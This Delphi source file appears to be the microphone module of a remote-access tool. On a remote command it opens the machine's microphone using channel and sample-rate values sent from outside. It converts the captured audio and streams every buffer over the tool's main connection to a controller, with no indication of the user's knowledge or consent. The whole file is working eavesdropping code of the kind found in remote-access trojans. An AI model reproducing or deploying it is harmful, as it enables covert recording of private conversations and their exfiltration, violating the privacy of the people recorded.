unit UnitMicrophone; 

interface

uses
  Windows, Classes, SysUtils, ACMConvertor, ACMIn, UnitCommands, MMSystem, UnitUtils,
  UnitCapture;

procedure MicrophoneThread(p: Pointer); stdcall;
procedure StopMicrophone;

var
  MicBool: Boolean;

implementation

uses
  UnitConnection;

type
  TMain = class
    procedure BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
  end;

threadvar
  ACMC: TACMConvertor;
  ACMI: TACMIn;
  Main: TMain;

procedure MicrophoneThread(p: Pointer); stdcall;
var
  Format: TWaveFormatEx;
  TmpList: TStringArray;
begin
  TmpList := PCaptureInfos(p)^.TmpList;
  SendDatas(IntToStr(CMD_MICROPHONE) + '|' + IntToStr(CMD_MICROPHONE_START) + '|');

  Format.nChannels := StrToInt(TmpList[0]);
  Format.nSamplesPerSec := StrToInt(TmpList[1]);
  Format.wBitsPerSample := 16;
  Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
  Format.nBlockAlign := Format.nChannels * 2;

  ACMC := TACMConvertor.Create;
  ACMC.FormatIn.Format.nChannels := Format.nChannels;
  ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
  ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
  ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
  ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
  ACMC.InputBufferSize := ACMC.FormatIn.Format.nAvgBytesPerSec;

  Main := TMain.Create;
  ACMI := TACMIn.Create;
  ACMI.OnBufferFull := Main.BufferFull;
  ACMI.BufferSize := ACMC.InputBufferSize;
  
  ACMC.Active := True;
  ACMI.Open(ACMC.FormatIn);

  while MicBool = True do ProcessMessages; //working like a loop
end;

procedure StopMicrophone;
begin
  try
    ACMC.Active := False;
    ACMI.Close;
    ACMI.Free;
    ACMC.Free;
    Main.Free;
    Main := nil;
  except
  end;
end;

procedure TMain.BufferFull(Sender: TObject; Data: Pointer; Size: Integer);
var
  Stream: TMemoryStream;
  TmpSize: Integer;
begin
  Move(Data^, ACMC.BufferIn^, Size);
  TmpSize := ACMC.Convert;
  Stream := TMemoryStream.Create; //don't need to compress stream, size is not high
  Stream.Write(ACMC.BufferOut^, TmpSize);
  Stream.Position := 0;

  SendDatas(IntToStr(CMD_MICROPHONE) + '|' + IntToStr(CMD_MICROPHONE_CAPTURE) + '|' +
    IntToStr(Stream.Size) + #0);
  MainConnection.SendStream(Stream, nil);
end;

end.

